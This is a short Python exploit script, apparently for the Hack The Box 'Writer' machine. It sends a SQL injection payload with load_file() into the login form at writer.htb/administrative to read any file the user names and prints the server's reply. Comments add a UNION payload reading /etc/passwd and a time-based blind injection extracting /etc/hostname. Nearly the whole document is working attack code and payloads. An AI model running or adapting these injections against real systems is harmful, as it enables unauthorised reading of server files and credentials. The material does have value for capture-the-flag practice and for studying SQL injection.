## via_burp_obvi_
##

import requests

while True:
    file = input('file: ')
    payload = f"\"asdf' UNION ALL SELECT NULL,load_file('{file}'),NULL,NULL,NULL,NULL; -- \""
    burp0_url = "http://writer.htb:80/administrative"
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://writer.htb", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://writer.htb/administrative", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    burp0_data = {"uname": payload, "password": "asdf"}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    print(r.text)
    
######################
###############
##
##


##
## oops' UNION ALL SELECT 0,LOAD_FILE('/etc/passwd'),2,3,4,5; --
##
## UNAME' AND (SELECT 1088 FROM (SELECT(SLEEP(1- (IF(ORD(MID((IFNULL(CAST(HEX(LOAD_FILE(/etc/hostname)) AS NCHAR), )),6,1))>57,0,1)))))ZDPK) AND 'GIYW'='GIYW
##
##
